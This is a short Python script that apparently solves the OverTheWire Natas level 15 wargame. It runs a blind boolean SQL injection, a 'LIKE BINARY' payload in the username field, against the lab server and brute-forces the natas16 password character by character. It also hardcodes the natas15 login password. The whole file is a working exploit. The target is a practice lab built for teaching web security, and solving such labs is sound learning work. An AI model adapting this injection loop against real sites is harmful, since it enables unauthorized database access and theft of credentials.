#!/usr/bin/python
# brute force

import httplib2
import urllib

char = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
MAX = len(char)

login_username = 'natas15'
login_password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J' 

search_username = "natas16"
search_password = ""
#under_score = "_"
#password_length = 32
start_pattern = search_username + '\" AND password LIKE BINARY \"' 
#start_pattern = search_username + '\" AND password BETWEEN \"' 
#and_between = '\" AND BINARY \"'
end_pattern = "%\" ;# "
url_pattern = "http://natas15.natas.labs.overthewire.org/index.php?"
match_text = "This user exist"

# connect
handler = httplib2.Http()
handler.add_credentials(login_username, login_password)

index = 0
while index < MAX:
	query = urllib.urlencode(dict(username=start_pattern + search_password + char[index] + end_pattern))
	resp, content = handler.request(url_pattern + query, method="POST")
	#print(char[index], match_text in str(content))
	if (match_text in str(content)):
		search_password += char[index];
		print("New Password: " + search_password)
		index = 0
		continue
	index += 1


